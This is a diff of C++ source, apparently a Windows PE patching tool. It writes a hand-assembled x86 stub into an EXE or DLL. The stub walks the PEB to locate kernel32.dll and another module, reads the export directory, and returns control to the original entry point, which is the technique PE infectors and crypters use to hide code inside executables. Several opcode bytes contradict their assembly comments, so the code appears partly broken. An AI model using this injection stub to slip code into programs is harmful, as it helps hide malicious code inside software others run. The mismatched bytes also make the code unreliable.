@@ -52,6 +52,7 @@ int main(int argc, char* argv[])
 	strcpy(pNameSrc, argv[1]);
 	strcpy(pNameDes, argv[2]);
 
+
 	FILE* fp = fopen(pNameSrc, "rb");//
 
 	if(fp)
@@ -224,9 +225,54 @@ int main(int argc, char* argv[])
 		{
 			bCheckExeOrDLL = true;
 		}
+
+		buf[stSize + i32stSizeCnt++] = '\x60';
+
+
+		std::string strReverseDesName;
+		std::vector<std::string> vctReverseDesName;
+
+		int32_t i32SizeNameDes = strlen(pNameDes);
+		for(int32_t i = 0; i < i32SizeNameDes; i += 2)
+		{
+			for(int32_t j = 0; j < 2; j++)
+			{
+				strReverseDesName.push_back(pNameDes[i + j]);
+			}
+			vctReverseDesName.push_back(strReverseDesName);
+			strReverseDesName.clear();
+		}
+
+		int32_t i32SizeVctDesName = vctReverseDesName.size();
+		int32_t i32TotalStackPop = 0;
+
 		if(bCheckExeOrDLL == true)
 		{
-			buf[stSize + i32stSizeCnt++] = '\x60';
+			i32TotalStackPop = i32SizeVctDesName + 3;
+
+
+			buf[stSize + i32stSizeCnt++] = '\x6a';
+			buf[stSize + i32stSizeCnt++] = '\x00';//push 0x0
+
+			for(int32_t i = i32SizeVctDesName - 1; i >= 0; i--)
+			{
+				//buf[stSize + i32stSizeCnt++] = '\x48';
+				buf[stSize + i32stSizeCnt++] = '\x31';
+				buf[stSize + i32stSizeCnt++] = '\xc0';
+
+				std::string strTemp = vctReverseDesName[i];
+				//buf[stSize + i32stSizeCnt++] = '\x48';
+				buf[stSize + i32stSizeCnt++] = '\xb8';
+				buf[stSize + i32stSizeCnt++] = strTemp[0];
+				buf[stSize + i32stSizeCnt++] = '\x0';
+				buf[stSize + i32stSizeCnt++] = strTemp[1];
+				buf[stSize + i32stSizeCnt++] = '\x0';
+
+				buf[stSize + i32stSizeCnt++] = '\x50';
+			}
+			vctReverseDesName.clear();
+
+			buf[stSize + i32stSizeCnt++] = '\x54';
 
 			buf[stSize + i32stSizeCnt++] = '\x64';
 			buf[stSize + i32stSizeCnt++] = '\xa1';
@@ -252,95 +298,23 @@ int main(int argc, char* argv[])
 
 			buf[stSize + i32stSizeCnt++] = '\x8b';
 			buf[stSize + i32stSizeCnt++] = '\x7a';
-			buf[stSize + i32stSizeCnt++] = '\x18';// mov edi, [ edx+0x1c ]
-
-
-			//if(bCheckExeOrDLL == FALSE)
-			//{
-			//	buf[stSize + i32stSizeCnt++] = '\x83';
-			//	buf[stSize + i32stSizeCnt++] = '\xe9';
-			//	buf[stSize + i32stSizeCnt++] = '\x0c';// sub ecx, 0xc
-
-			//	buf[stSize + i32stSizeCnt++] = '\x89';
-			//	buf[stSize + i32stSizeCnt++] = '\x39';// mov [ecx],edi
-			//}
+			buf[stSize + i32stSizeCnt++] = '\x30';// mov edi, [ edx+0x30 ]
 
 			int loaderloop2 = i32stSizeCnt;
 
-			buf[stSize + i32stSizeCnt++] = '\x53';//push ebx
+			buf[stSize + i32stSizeCnt++] = '\x57';//push edi
 
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x13';// mov edx, [ebx]<--here
-
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x7c';// mov edx, [ebx]<--here
-			buf[stSize + i32stSizeCnt++] = '\x24';
-			buf[stSize + i32stSizeCnt++] = '\x28';// mov edx, [ebx]<--here
-
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\xcf';
-
-			buf[stSize + i32stSizeCnt++] = '\x83';
-			buf[stSize + i32stSizeCnt++] = '\xc1';
-			buf[stSize + i32stSizeCnt++] = '\x3c';
-
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x09';
-
-			buf[stSize + i32stSizeCnt++] = '\x03';
-			buf[stSize + i32stSizeCnt++] = '\xcf';
-
-			buf[stSize + i32stSizeCnt++] = '\x83';
-			buf[stSize + i32stSizeCnt++] = '\xc1';
-			buf[stSize + i32stSizeCnt++] = '\x28';
-
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x09';
-
-			buf[stSize + i32stSizeCnt++] = '\x03';
-			buf[stSize + i32stSizeCnt++] = '\xcf';
-
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\xf1';
-
-			buf[stSize + i32stSizeCnt++] = '\x81';
-			buf[stSize + i32stSizeCnt++] = '\xc6';
-			buf[stSize + i32stSizeCnt++] = '\xc0';
-			buf[stSize + i32stSizeCnt++] = '\x05';
-			buf[stSize + i32stSizeCnt++] = '\x00';
-			buf[stSize + i32stSizeCnt++] = '\x00';// add esi,0x400
-
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x7a';
-			buf[stSize + i32stSizeCnt++] = '\x30';// mov edi, [ edx + 0x30 ] <-DllName
-
-			buf[stSize + i32stSizeCnt++] = '\x52';// push edx
-			//buf[stSize + i32stSizeCnt++] = '\x57';// push edx
-
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x7a';
-			buf[stSize + i32stSizeCnt++] = '\x30';// mov edi, [ edx + 0x30 ] <-DllName
-
-			buf[stSize + i32stSizeCnt++] = '\x57';// push edi
-
-			buf[stSize + i32stSizeCnt++] = '\x56';// push esi
-
-			buf[stSize + i32stSizeCnt++] = '\xb9';
-			buf[stSize + i32stSizeCnt++] = '\x0';
-			buf[stSize + i32stSizeCnt++] = '\x0';
-			buf[stSize + i32stSizeCnt++] = '\x0';
-			buf[stSize + i32stSizeCnt++] = '\x0';// mov ecx,0
-
-			int From2 = i32stSizeCnt;
+			buf[stSize + i32stSizeCnt++] = '\x33';
+			buf[stSize + i32stSizeCnt++] = '\xc9';// xor ecx, ecx
 
 			buf[stSize + i32stSizeCnt++] = '\x8b';
 			buf[stSize + i32stSizeCnt++] = '\x3c';
-			buf[stSize + i32stSizeCnt++] = '\x24';// mov edi, dword ptr [esp]
+			buf[stSize + i32stSizeCnt++] = '\x24';// mov edi,[esp]
 
 			buf[stSize + i32stSizeCnt++] = '\x8b';
 			buf[stSize + i32stSizeCnt++] = '\x74';
 			buf[stSize + i32stSizeCnt++] = '\x24';
-			buf[stSize + i32stSizeCnt++] = '\x4';// mov esi, dword ptr [esp+4]
+			buf[stSize + i32stSizeCnt++] = '\x04';// mov esi, [esp+4]
 
 			buf[stSize + i32stSizeCnt++] = '\x03';
 			buf[stSize + i32stSizeCnt++] = '\xf9';// add edi, ecx
@@ -350,32 +324,12 @@ int main(int argc, char* argv[])
 
 			buf[stSize + i32stSizeCnt++] = '\x83';
 			buf[stSize + i32stSizeCnt++] = '\xc1';
-			buf[stSize + i32stSizeCnt++] = '\x02';// add ecx, 2
+			buf[stSize + i32stSizeCnt++] = '\x01';// add ecx, 1
 
-			buf[stSize + i32stSizeCnt++] = '\x66';
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x36';//mov si, [esi]
-
-			buf[stSize + i32stSizeCnt++] = '\x66';
-			buf[stSize + i32stSizeCnt++] = '\x39';
-			buf[stSize + i32stSizeCnt++] = '\x37';// cmp word ptr [edi],[si]
-
-
-			int To2 = i32stSizeCnt;
-
-			char offset2[4] = { 0 };
-
-			int FromTo2 = From2 - To2 - 2;
-			memcpy((void*)&offset2, (void*)&(FromTo2), 4);
-
-
-			buf[stSize + i32stSizeCnt++] = '\x74';
-			buf[stSize + i32stSizeCnt++] = offset2[0];
 
 			buf[stSize + i32stSizeCnt++] = '\x81';
 			buf[stSize + i32stSizeCnt++] = '\xf9';
-
-			int32_t i32strNameLen = (strlen(pNameDes) + 2) * 2;
+			int32_t i32strNameLen = (strlen(pNameDes) + 1) * 2;
 			char cstrNameLen[4] = { 0, };
 			memcpy((void*)&cstrNameLen, (void*)&i32strNameLen, 4);
 
@@ -384,91 +338,79 @@ int main(int argc, char* argv[])
 			buf[stSize + i32stSizeCnt++] = cstrNameLen[2];// cmp ecx,0x1c
 			buf[stSize + i32stSizeCnt++] = cstrNameLen[3];// cmp ecx,0x1c
 
+			///////////// jump Down
+			buf[stSize + i32stSizeCnt++] = '\x73';
+			buf[stSize + i32stSizeCnt++] = '\xd';// jae Down
+
+
+			buf[stSize + i32stSizeCnt++] = '\x33';
+			buf[stSize + i32stSizeCnt++] = '\xd8';// xor ebx, ebx
+
+			buf[stSize + i32stSizeCnt++] = '\x8a';
+			buf[stSize + i32stSizeCnt++] = '\x1e';// mov bl, byte ptr:[esi]
+
+			buf[stSize + i32stSizeCnt++] = '\x38';
+			buf[stSize + i32stSizeCnt++] = '\x1f';// cmp byte ptr[edi],bl
 
 
 			buf[stSize + i32stSizeCnt++] = '\x74';
-			buf[stSize + i32stSizeCnt++] = '\x8';// je 0xc
-
-			buf[stSize + i32stSizeCnt++] = '\x5e';// pop esi
+			buf[stSize + i32stSizeCnt++] = '\xe2';// je 위로
 
 			buf[stSize + i32stSizeCnt++] = '\x5f';// pop edi
 
+			buf[stSize + i32stSizeCnt++] = '\x8b';
+			buf[stSize + i32stSizeCnt++] = '\x12';// mov edx,[edx]
 
-			buf[stSize + i32stSizeCnt++] = '\x5b';// pop ebx
-
-			buf[stSize + i32stSizeCnt++] = '\x5a';// pop edx
-
-			//buf[stSize + i32stSizeCnt++] = '\x8b';
-			//buf[stSize + i32stSizeCnt++] = '\x1b';//mov ebx,dword ptr [ebx]
-
-			buf[stSize + i32stSizeCnt++] = '\x3b';
-			buf[stSize + i32stSizeCnt++] = '\xda';//mov ebx,dword ptr [ebx]
-
-			int loaderloopto2 = i32stSizeCnt;
-
-			int LoaderOffset2 = loaderloop2 - loaderloopto2 - 2;
-
-			memcpy((void*)&offset2, (void*)&(LoaderOffset2), 4);
-
-			buf[stSize + i32stSizeCnt++] = '\x75';
-			buf[stSize + i32stSizeCnt++] = offset2[0];//jne loaderloop
+			buf[stSize + i32stSizeCnt++] = '\xeb';
+			buf[stSize + i32stSizeCnt++] = '\xd7';
 
 			buf[stSize + i32stSizeCnt++] = '\x83';
 			buf[stSize + i32stSizeCnt++] = '\xc4';
-			buf[stSize + i32stSizeCnt++] = '\x10';
+			buf[stSize + i32stSizeCnt++] = '\x08';// add esp,8
+
+			buf[stSize + i32stSizeCnt++] = '\xff';
+			buf[stSize + i32stSizeCnt++] = '\x72';
+			buf[stSize + i32stSizeCnt++] = '\x18';// push [edx+0x18]<-BaseAddress
+
+			buf[stSize + i32stSizeCnt++] = '\xff';
+			buf[stSize + i32stSizeCnt++] = '\x72';
+			buf[stSize + i32stSizeCnt++] = '\x1c';// push [edx+0x1c]<-EntryPoint
 
 			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x7c';// mov edx, [ebx]<--here
-			buf[stSize + i32stSizeCnt++] = '\x24';
-			buf[stSize + i32stSizeCnt++] = '\x24';// mov edx, [ebx]<--here
-
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\xcf';
-
-			buf[stSize + i32stSizeCnt++] = '\x83';
-			buf[stSize + i32stSizeCnt++] = '\xc1';
-			buf[stSize + i32stSizeCnt++] = '\x3c';
-
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x09';
-
-			buf[stSize + i32stSizeCnt++] = '\x03';
-			buf[stSize + i32stSizeCnt++] = '\xcf';
-
-			buf[stSize + i32stSizeCnt++] = '\x83';
-			buf[stSize + i32stSizeCnt++] = '\xc1';
-			buf[stSize + i32stSizeCnt++] = '\x28';
-
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x09';
-
-			buf[stSize + i32stSizeCnt++] = '\x03';
-			buf[stSize + i32stSizeCnt++] = '\xcf';
-
-
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\xf9';
+			buf[stSize + i32stSizeCnt++] = '\x0c';
+			buf[stSize + i32stSizeCnt++] = '\x24';// mov ecx,[esp]
 
 			buf[stSize + i32stSizeCnt++] = '\x81';
 			buf[stSize + i32stSizeCnt++] = '\xc1';
-
-			buf[stSize + i32stSizeCnt++] = '\x70';
+			buf[stSize + i32stSizeCnt++] = '\x78';
 			buf[stSize + i32stSizeCnt++] = '\x04';
 			buf[stSize + i32stSizeCnt++] = '\x0';
-			buf[stSize + i32stSizeCnt++] = '\x0';// add ecx,0x470
+			buf[stSize + i32stSizeCnt++] = '\x0';// add ecx,0x46c
 
 			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x09';//mov ecx,dword ptr[ecx]
+			buf[stSize + i32stSizeCnt++] = '\x09';// mov ecx,[ecx]
 
 			buf[stSize + i32stSizeCnt++] = '\x83';
 			buf[stSize + i32stSizeCnt++] = '\xf9';
-			buf[stSize + i32stSizeCnt++] = '\x01';// cmp ecx, 1
+			buf[stSize + i32stSizeCnt++] = '\x01';// cmp ecx,1
 
-			buf[stSize + i32stSizeCnt++] = '\x72';
-			buf[stSize + i32stSizeCnt++] = '\x06';
+			//////////////////////////////////////jump
+			buf[stSize + i32stSizeCnt++] = '\x75';
+			buf[stSize + i32stSizeCnt++] = '\x0c';// jne
+
+			char cSizeVctDesName[4] = { 0 };
+			i32SizeVctDesName += 3;
+			i32SizeVctDesName *= 4;
+			memcpy((void*)&cSizeVctDesName, (void*)&i32SizeVctDesName, 4);
+
+			buf[stSize + i32stSizeCnt++] = '\x81';
+			buf[stSize + i32stSizeCnt++] = '\xc4';
+			buf[stSize + i32stSizeCnt++] = cSizeVctDesName[0];
+			buf[stSize + i32stSizeCnt++] = cSizeVctDesName[1];
+			buf[stSize + i32stSizeCnt++] = cSizeVctDesName[2];
+			buf[stSize + i32stSizeCnt++] = cSizeVctDesName[3];
 
 			buf[stSize + i32stSizeCnt++] = '\x61';// popad
-
 
 			int i32AlreadyDecoding = i32stSizeCnt + i32RollBackEntryPoint;
 			int i32FLfunctionToEntryPointDecoding = i32EntryPoint - i32AlreadyDecoding - 5;// -3;
@@ -483,51 +425,10 @@ int main(int argc, char* argv[])
 			buf[stSize + i32stSizeCnt++] = cFLfunctionToEntryPointDecoding[1];
 			buf[stSize + i32stSizeCnt++] = cFLfunctionToEntryPointDecoding[2];
 			buf[stSize + i32stSizeCnt++] = cFLfunctionToEntryPointDecoding[3];
-		}
 
-		if(bCheckExeOrDLL == true)
-		{
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x44';
-			buf[stSize + i32stSizeCnt++] = '\x24';
-			buf[stSize + i32stSizeCnt++] = '\x24';
-
-			buf[stSize + i32stSizeCnt++] = '\x50';
-
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x3c';// mov edx, [ebx]<--here
-			buf[stSize + i32stSizeCnt++] = '\x24';
-	
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\xcf';
-
-			buf[stSize + i32stSizeCnt++] = '\x83';
-			buf[stSize + i32stSizeCnt++] = '\xc1';
-			buf[stSize + i32stSizeCnt++] = '\x3c';
-
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x09';
-
-			buf[stSize + i32stSizeCnt++] = '\x03';
-			buf[stSize + i32stSizeCnt++] = '\xcf';
-
-			buf[stSize + i32stSizeCnt++] = '\x83';
-			buf[stSize + i32stSizeCnt++] = '\xc1';
-			buf[stSize + i32stSizeCnt++] = '\x28';
-
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x09';
-
-			buf[stSize + i32stSizeCnt++] = '\x03';
-			buf[stSize + i32stSizeCnt++] = '\xcf';
-
-			buf[stSize + i32stSizeCnt++] = '\x51';
 		}
 		else
 		{
-			buf[stSize + i32stSizeCnt++] = '\x60';
-
-
 			buf[stSize + i32stSizeCnt++] = '\x64';
 			buf[stSize + i32stSizeCnt++] = '\xa1';
 			buf[stSize + i32stSizeCnt++] = '\x18';
@@ -550,39 +451,28 @@ int main(int argc, char* argv[])
 			buf[stSize + i32stSizeCnt++] = '\x8b';
 			buf[stSize + i32stSizeCnt++] = '\x13';// mov edx, [ebx]<--here
 
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x7a';
-			buf[stSize + i32stSizeCnt++] = '\x18';// mov edi, [ edx+0x1c ]
+			buf[stSize + i32stSizeCnt++] = '\xff';
+			buf[stSize + i32stSizeCnt++] = '\x72';
+			buf[stSize + i32stSizeCnt++] = '\x18';// push [edx+0x18]<-BaseAddress
 
-			buf[stSize + i32stSizeCnt++] = '\x57';// push edi
-
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\xcf';
-
-			buf[stSize + i32stSizeCnt++] = '\x83';
-			buf[stSize + i32stSizeCnt++] = '\xc1';
-			buf[stSize + i32stSizeCnt++] = '\x3c';
-
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x09';
-
-			buf[stSize + i32stSizeCnt++] = '\x03';
-			buf[stSize + i32stSizeCnt++] = '\xcf';
-
-			buf[stSize + i32stSizeCnt++] = '\x83';
-			buf[stSize + i32stSizeCnt++] = '\xc1';
-			buf[stSize + i32stSizeCnt++] = '\x28';
-
-			buf[stSize + i32stSizeCnt++] = '\x8b';
-			buf[stSize + i32stSizeCnt++] = '\x09';
-
-			buf[stSize + i32stSizeCnt++] = '\x03';
-			buf[stSize + i32stSizeCnt++] = '\xcf';
-
-
-			buf[stSize + i32stSizeCnt++] = '\x51';// push ecx
-
+			buf[stSize + i32stSizeCnt++] = '\xff';
+			buf[stSize + i32stSizeCnt++] = '\x72';
+			buf[stSize + i32stSizeCnt++] = '\x1c';// push [edx+0x1c]<-EntryPoint
 		}
+
+
+		buf[stSize + i32stSizeCnt++] = '\x8b';
+		buf[stSize + i32stSizeCnt++] = '\x14';
+		buf[stSize + i32stSizeCnt++] = '\x24';//mov edx,[esp]
+
+		buf[stSize + i32stSizeCnt++] = '\x81';
+		buf[stSize + i32stSizeCnt++] = '\xc2';
+		buf[stSize + i32stSizeCnt++] = '\x0';
+		buf[stSize + i32stSizeCnt++] = '\x04';
+		buf[stSize + i32stSizeCnt++] = '\x0';
+		buf[stSize + i32stSizeCnt++] = '\x0';// mov edx,0x400
+
+		buf[stSize + i32stSizeCnt++] = '\x52';// push edx
 
 
 		buf[stSize + i32stSizeCnt++] = '\x64';
@@ -609,246 +499,202 @@ int main(int argc, char* argv[])
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x7a';
-		buf[stSize + i32stSizeCnt++] = '\x18';// mov edi, [ edx+0x1c ]
+		buf[stSize + i32stSizeCnt++] = '\x30';// mov edi, [ edx+0x30 ]
 
-		int loaderloop = i32stSizeCnt;
+		buf[stSize + i32stSizeCnt++] = '\x57';//push edi
 
-		buf[stSize + i32stSizeCnt++] = '\x53';//push ebx
-
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x13';// mov edx, [ebx]<--here
-
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x74';
-		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x04';
-
-		buf[stSize + i32stSizeCnt++] = '\x81';
-		buf[stSize + i32stSizeCnt++] = '\xc6';
-		buf[stSize + i32stSizeCnt++] = '\x00';
-		buf[stSize + i32stSizeCnt++] = '\x04';
-		buf[stSize + i32stSizeCnt++] = '\x00';
-		buf[stSize + i32stSizeCnt++] = '\x00';// add esi,0x400
-
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x7a';
-		buf[stSize + i32stSizeCnt++] = '\x30';// mov edi, [ edx + 0x30 ] <-DllName
-
-		buf[stSize + i32stSizeCnt++] = '\x52';// push edx
-		//buf[stSize + i32stSizeCnt++] = '\x57';// push edx
-
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x7a';
-		buf[stSize + i32stSizeCnt++] = '\x30';// mov edi, [ edx + 0x30 ] <-DllName
-
-		buf[stSize + i32stSizeCnt++] = '\x57';// push edi
-
-		buf[stSize + i32stSizeCnt++] = '\x56';// push esi
-
-		buf[stSize + i32stSizeCnt++] = '\xb9';
-		buf[stSize + i32stSizeCnt++] = '\x0';
-		buf[stSize + i32stSizeCnt++] = '\x0';
-		buf[stSize + i32stSizeCnt++] = '\x0';
-		buf[stSize + i32stSizeCnt++] = '\x0';// mov ecx,0
-
-		int From = i32stSizeCnt;
+		buf[stSize + i32stSizeCnt++] = '\x31';
+		buf[stSize + i32stSizeCnt++] = '\xc9';// xor ecx, ecx
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x3c';
-		buf[stSize + i32stSizeCnt++] = '\x24';// mov edi, dword ptr [esp]
+		buf[stSize + i32stSizeCnt++] = '\x24';// mov edi,[esp]
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x74';
 		buf[stSize + i32stSizeCnt++] = '\x24';
-		buf[stSize + i32stSizeCnt++] = '\x4';// mov esi, dword ptr [esp+4]
+		buf[stSize + i32stSizeCnt++] = '\x04';// mov esi,[esp+4]
 
-		buf[stSize + i32stSizeCnt++] = '\x03';
-		buf[stSize + i32stSizeCnt++] = '\xf9';// add edi, ecx
+		buf[stSize + i32stSizeCnt++] = '\x01';
+		buf[stSize + i32stSizeCnt++] = '\xcf';// add edi, ecx
 
-		buf[stSize + i32stSizeCnt++] = '\x03';
-		buf[stSize + i32stSizeCnt++] = '\xf1';// add esi, ecx
+		buf[stSize + i32stSizeCnt++] = '\x01';
+		buf[stSize + i32stSizeCnt++] = '\xce';// add esi, ecx
 
 		buf[stSize + i32stSizeCnt++] = '\x83';
 		buf[stSize + i32stSizeCnt++] = '\xc1';
-		buf[stSize + i32stSizeCnt++] = '\x02';// add ecx, 2
+		buf[stSize + i32stSizeCnt++] = '\x01';//add ecx, 1
 
-		buf[stSize + i32stSizeCnt++] = '\x66';
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x36';//mov si, [esi]
+		char cKernel32[] = "kernel32.dll";
 
-		buf[stSize + i32stSizeCnt++] = '\x66';
-		buf[stSize + i32stSizeCnt++] = '\x39';
-		buf[stSize + i32stSizeCnt++] = '\x37';// cmp word ptr [edi],[si]
-
-
-		int To = i32stSizeCnt;
-
-		char offset[4] = { 0 };
-
-		int FromTo = From - To - 2;
-		memcpy((void*)&offset, (void*)&(FromTo), 4);
-
-
-		buf[stSize + i32stSizeCnt++] = '\x74';
-		buf[stSize + i32stSizeCnt++] = offset[0];
-
-		buf[stSize + i32stSizeCnt++] = '\x81';
-		buf[stSize + i32stSizeCnt++] = '\xf9';
-
-		char cKernel32[] = "KERNEL32.DLL";
-	
-		int32_t i32strNameLen = (strlen(cKernel32) + 2) * 2;
+		int32_t i32strNameLen = (strlen(cKernel32) + 1) * 2;
 		char cstrNameLen[4] = { 0, };
 		memcpy((void*)&cstrNameLen, (void*)&i32strNameLen, 4);
 
+		buf[stSize + i32stSizeCnt++] = '\x81';
+		buf[stSize + i32stSizeCnt++] = '\xf9';
 		buf[stSize + i32stSizeCnt++] = cstrNameLen[0];// cmp ecx,0x1c
 		buf[stSize + i32stSizeCnt++] = cstrNameLen[1];// cmp ecx,0x1c
 		buf[stSize + i32stSizeCnt++] = cstrNameLen[2];// cmp ecx,0x1c
 		buf[stSize + i32stSizeCnt++] = cstrNameLen[3];// cmp ecx,0x1c
 
+		buf[stSize + i32stSizeCnt++] = '\x73';
+		buf[stSize + i32stSizeCnt++] = '\x14'; // xor ebx,ebx
 
+		buf[stSize + i32stSizeCnt++] = '\x31';
+		buf[stSize + i32stSizeCnt++] = '\xdb'; // xor ebx,ebx
+
+		buf[stSize + i32stSizeCnt++] = '\x8a';
+		buf[stSize + i32stSizeCnt++] = '\x1e';// mov bl,[esi]
+
+		buf[stSize + i32stSizeCnt++] = '\x38';
+		buf[stSize + i32stSizeCnt++] = '\x1f';// cmp [edi],bl
 
 		buf[stSize + i32stSizeCnt++] = '\x74';
-		buf[stSize + i32stSizeCnt++] = '\x8';// je 0xc
+		buf[stSize + i32stSizeCnt++] = '\xe2';// je up
 
-		buf[stSize + i32stSizeCnt++] = '\x5e';// pop esi
+		buf[stSize + i32stSizeCnt++] = '\x82';
+		buf[stSize + i32stSizeCnt++] = '\xeb';
+		buf[stSize + i32stSizeCnt++] = '\x20';// add esp,0x4
+
+		buf[stSize + i32stSizeCnt++] = '\x38';
+		buf[stSize + i32stSizeCnt++] = '\x1f';// cmp [edi],bl
+
+		buf[stSize + i32stSizeCnt++] = '\x74';
+		buf[stSize + i32stSizeCnt++] = '\xdb';// je up
 
 		buf[stSize + i32stSizeCnt++] = '\x5f';// pop edi
-
-
-		buf[stSize + i32stSizeCnt++] = '\x5b';// pop ebx
-
-		buf[stSize + i32stSizeCnt++] = '\x5a';// pop edx
-
-		//buf[stSize + i32stSizeCnt++] = '\x8b';
-		//buf[stSize + i32stSizeCnt++] = '\x1b';//mov ebx,dword ptr [ebx]
-
-		buf[stSize + i32stSizeCnt++] = '\x3b';
-		buf[stSize + i32stSizeCnt++] = '\xda';//mov ebx,dword ptr [ebx]
-
-		int loaderloopto = i32stSizeCnt;
-
-		int LoaderOffset = loaderloop - loaderloopto - 2;
-
-		memcpy((void*)&offset, (void*)&(LoaderOffset), 4);
-
-		buf[stSize + i32stSizeCnt++] = '\x75';
-		buf[stSize + i32stSizeCnt++] = offset[0];//jne loaderloop
-		/////////////////////////////Start////////////////////////////////////
-		int32_t i32ExportDirectory = pDosH->e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + 0x58;
-		char cExportDirectory[4] = { 0 };
-		memcpy((void*)&cExportDirectory, (void*)&i32ExportDirectory, 4);
-
-		buf[stSize + i32stSizeCnt++] = '\x83';
-		buf[stSize + i32stSizeCnt++] = '\xc4';
-		buf[stSize + i32stSizeCnt++] = '\x10';// add esp,0x10
-
-		buf[stSize + i32stSizeCnt++] = '\x83';
-		buf[stSize + i32stSizeCnt++] = '\xc2';
-		buf[stSize + i32stSizeCnt++] = '\x18';// add edx,0x18
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x12';// mov edx,[edx]
 
-		buf[stSize + i32stSizeCnt++] = '\x52';// push edx
+		buf[stSize + i32stSizeCnt++] = '\xeb';
+		buf[stSize + i32stSizeCnt++] = '\xd0';//jmp
 
+		buf[stSize + i32stSizeCnt++] = '\x83';
+		buf[stSize + i32stSizeCnt++] = '\xc4';
+		buf[stSize + i32stSizeCnt++] = '\x04';// add esp,0x4
 
-
+		buf[stSize + i32stSizeCnt++] = '\xff';
+		buf[stSize + i32stSizeCnt++] = '\x72';
+		buf[stSize + i32stSizeCnt++] = '\x18';//push [edx+0x18]
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
 		buf[stSize + i32stSizeCnt++] = '\x04';
-		buf[stSize + i32stSizeCnt++] = '\x24';// mov eax,[esp]<-Kernel32.dll BaseAddress
+		buf[stSize + i32stSizeCnt++] = '\x24';// mov eax,[esp]
 
-
-
-		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\xd8';//mov ebx, eax
+		buf[stSize + i32stSizeCnt++] = '\x89';
+		buf[stSize + i32stSizeCnt++] = '\xc3';// mov ebx,eax
 
 		buf[stSize + i32stSizeCnt++] = '\x83';
 		buf[stSize + i32stSizeCnt++] = '\xc3';
-		buf[stSize + i32stSizeCnt++] = '\x3c';
-		buf[stSize + i32stSizeCnt++] = '\x8b';//mov ebx, eax
-		buf[stSize + i32stSizeCnt++] = '\x1b';
+		buf[stSize + i32stSizeCnt++] = '\x3c';//add ebx,0x3c
 
-		buf[stSize + i32stSizeCnt++] = '\x03';
-		buf[stSize + i32stSizeCnt++] = '\xd8';//mov ebx, eax
-
-		buf[stSize + i32stSizeCnt++] = '\x83';
-		buf[stSize + i32stSizeCnt++] = '\xc3';//mov ebx, eax
-		buf[stSize + i32stSizeCnt++] = '\x78';
+		buf[stSize + i32stSizeCnt++] = '\x31';
+		buf[stSize + i32stSizeCnt++] = '\xf6';// xor esi, esi
 
 		buf[stSize + i32stSizeCnt++] = '\x8b';
-		buf[stSize + i32stSizeCnt++] = '\x1b';// mov ebx,[ebx]
+		buf[stSize + i32stSizeCnt++] = '\x33';// mov esi, [ebx]
 
-		buf[stSize + i32stSizeCnt++] = '\x03';
-		buf[stSize + i32stSizeCnt++] = '\xd8';// mov ebx,eax
+		buf[stSize + i32stSizeCnt++] = '\x31';
+		buf[stSize + i32stSizeCnt++] = '\xdb';//xore ebx,ebx
 
+		buf[stSize + i32stSizeCnt++] = '\x89';
+		buf[stSize + i32stSizeCnt++] = '\xf3';// mov ebx,esi
+
+		buf[stSize + i32stSizeCnt++] = '\x01';
+		buf[stSize + i32stSizeCnt++] = '\xc3';//add ebx, eax
+
+		buf[stSize + i32stSizeCnt++] = '\x83';
+		buf[stSize + i32stSizeCnt++] = '\xc3';
